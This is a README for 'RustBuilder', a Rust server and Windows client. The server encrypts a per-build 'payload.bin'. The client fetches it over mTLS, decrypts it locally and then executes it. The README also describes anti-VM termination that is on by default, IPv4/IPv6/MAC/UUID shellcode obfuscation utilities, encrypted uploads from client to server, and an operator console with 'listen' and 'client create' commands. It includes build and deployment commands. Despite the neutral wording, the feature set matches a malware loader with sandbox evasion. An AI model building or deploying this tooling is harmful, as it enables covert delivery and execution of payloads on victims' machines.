# RustBuilder

A server/client system where the **server** generates a fresh PGP keypair for every
build, compiles a dedicated **client** binary for that build, encrypts the target
artifact with the build's public key, and stores every secret in an encrypted SQLite
database. The **client** downloads the encrypted artifact over mutually-authenticated
TLS (mTLS), fetches its private key from the server, and **decrypts locally** — the
plaintext never exists on the server at runtime.

## Documentation

Full documentation lives in `docs/`:

- **English**: [`docs/en/README.md`](docs/en/README.md) — architecture, security, API,
  build, run, history, troubleshooting.
- **Português**: [`docs/README.md`](docs/README.md) — arquitetura, segurança, API,
  compilação, execução, histórico, troubleshooting.

## Current status

The current implementation provides:

- per-build PGP key generation and encrypted artifact storage;
- encrypted-at-rest secrets using Argon2id and XChaCha20-Poly1305;
- a Rust server with mTLS, build-bound client certificates, and a SQLite store;
- streamed, gzip-capable artifact downloads;
- streamed diagnostic uploads encrypted by the client with the build's public key;
- optional Windows anti-VM protection, enabled by default and disabled with
  `--no-antivm`;
- optional `obfs` utilities for IPv4, IPv6, MAC and UUID shellcode
  obfuscation/deobfuscation;
- a local operator CLI with named users, an interactive console, build history, logs and
  diagnostic inventory;
- debug client builds that write diagnostics to `Desktop/RustBuilder-debug/client.log`;
- Linux-to-Windows client cross-compilation through the `x86_64-pc-windows-gnu` target;
- server operator commands for builds, logs, and diagnostics.

Diagnostic ciphertext is currently stored as an opaque `.pgp` file under
`data/diagnostics/<build-id>/`; indexing it in SQLite is a future step.

## Workspace

- `crates/common` — PGP keygen/encrypt/decrypt (rpgp), sealed-storage crypto
  (Argon2id master key + XChaCha20-Poly1305), shared protocol types.
- `crates/server` — axum + mTLS API, encrypted SQLite store, per-build CA-signed client
  certificates, and the build orchestrator that compiles the client.
- `crates/client` — the per-build downloader and diagnostic uploader; server URL, CA cert,
  mTLS client identity, and the build's PGP public key are embedded at compile time by
  `build.rs`. Optional anti-VM protection is gated by the `antivm` feature (see below).

## Security model

- Each build gets its own PGP keypair. Both halves are sealed at rest with a key derived
  from `SERVER_MASTER_PASSPHRASE` (Argon2id) and never written unsealed.
- The private key is unsealed only in server RAM to answer `GET /builds/:id/key`, only
  over mTLS, and only to a client whose certificate common-name matches the build id.
- The CA private key is sealed with the same master key.
- Because the server compiles the client and embeds the mTLS client identity, **possession
  of the client binary is the identity**. Losing `SERVER_MASTER_PASSPHRASE` makes the DB
  unrecoverable by design.

## Usage

For a local build, `./build.sh` builds the release server and the Windows client.
Use `./build.sh --debug` for native debug builds. The cross-compilation prerequisites
are described below and in [`docs/en/build.md`](docs/en/build.md).

Create a build (generates keypair, encrypts the artifact, compiles the client):

```
SERVER_MASTER_PASSPHRASE=... \
cargo run -p server -- --db data/orch.db --data-dir data \
  new-build --artifact ./payload.bin --uid my-release \
  --server-url https://your-host:8443 \
  --target x86_64-pc-windows-gnu
```

Run the API (mTLS required):

```
SERVER_MASTER_PASSPHRASE=... \
cargo run -p server -- --db data/orch.db --data-dir data \
  serve --addr 0.0.0.0:8443 --san your-host --san 127.0.0.1
```

Run the produced client (found under `data/clients/<build-id>/`). It downloads and decrypts
the artifact locally, writes it to `--out`, and then executes it:

```
client --out ./decrypted.bin
```

If `--out` is omitted, the client uses a file in the system temporary directory. The
downloaded ciphertext is staged beside the output as `<out>.part` and removed after the
download attempt.

Upload an encrypted diagnostic file to the server (`POST /builds/:id/diagnostics`, streamed
in chunks; encrypted with the build's embedded PGP public key, stored server-side as an opaque
blob under `data/diagnostics/<id>/`):

```
client --upload ./diagnostic.txt
```

Upload mode exits after sending the encrypted diagnostic and does not download or execute an
artifact. The server stores the opaque `.pgp` blob under `data/diagnostics/<build-id>/`.

Initialize local administrative access before using protected server commands:

```
SERVER_MASTER_PASSPHRASE=... ./target/release/server user create operator
SERVER_MASTER_PASSPHRASE=... ./target/release/server console
```

The CLI separately prompts for the application username/password. Administrative access is
local only; it is not exposed through the HTTP API. Use `help` inside `console` to see
`builds`, `logs`, `diagnostics`, `listen`, and `client create`.

The client also accepts `--server` and `--build-id` when running a development build;
generated clients have these values embedded by `build.rs`.

## Anti-VM protection (`antivm` feature)

The client can bundle the [`antivm`](https://github.com/northernboykisser/anti-vm-rust) library
to terminate in unwanted environments. It is opt-out via a compile-time feature (on by default,
Windows-only at runtime). Disable it for development/testing:

```
cargo build -p client --no-default-features                              # dev build, no antivm
./target/release/server new-build --artifact payload.bin --uid dev --no-antivm \
  --target x86_64-pc-windows-gnu                                         # orchestrated, no antivm
```

`antivm` is used from a patched local copy in `vendor/antivm/` (via `[patch.crates-io]`) so it
cross-compiles from Linux. Details: [`docs/en/antivm.md`](docs/en/antivm.md) /
[`docs/antivm.md`](docs/antivm.md).

## Building the Windows client (cross-compiling from Linux)

The server is a Linux binary (`cargo build --release -p server`). The client targets
Windows and cross-compiles from Linux using the `x86_64-pc-windows-gnu` target and the
mingw-w64 linker.

One-time setup on the Linux build host:

```
sudo apt install mingw-w64        # provides x86_64-w64-mingw32-gcc
rustup target add x86_64-pc-windows-gnu
```

The linker is wired in `.cargo/config.toml`:

```
[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
ar = "x86_64-w64-mingw32-ar"
```

Compile the client template:

```
cargo build --release -p client --target x86_64-pc-windows-gnu
# -> target/x86_64-pc-windows-gnu/release/client.exe
```

Or produce a build-wired `client.exe` through the orchestrator (embeds the build id,
server URL, CA cert, and mTLS identity):

```
SERVER_MASTER_PASSPHRASE=... ./target/release/server \
  new-build --artifact ./payload.bin --uid win-release \
  --server-url https://your-host:8443 \
  --target x86_64-pc-windows-gnu
```

The TLS backend is `rustls` with the pure-Rust `ring` provider (no `aws-lc-sys`), so the
Windows client links with only the Rust toolchain plus the mingw-w64 gcc — no MSVC, no
`cmake`, no `nasm`.

For a development build without anti-VM protection, add `--no-default-features`. The
orchestrator exposes the same choice as `new-build --no-antivm`; use `--debug` for a native
debug client and `--obfs` to enable the `obf` subcommand.
